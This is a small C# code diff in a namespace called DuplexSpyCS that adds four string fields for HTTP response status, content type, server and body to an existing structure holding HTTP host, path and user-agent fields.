@@ -471,5 +471,10 @@ namespace DuplexSpyCS
         public string szHttpHost;
         public string szHttpPath;
         public string szHttpUA;
+
+        public string szStatus;
+        public string szContentType;
+        public string szServer;
+        public string szBody;
     }
 }
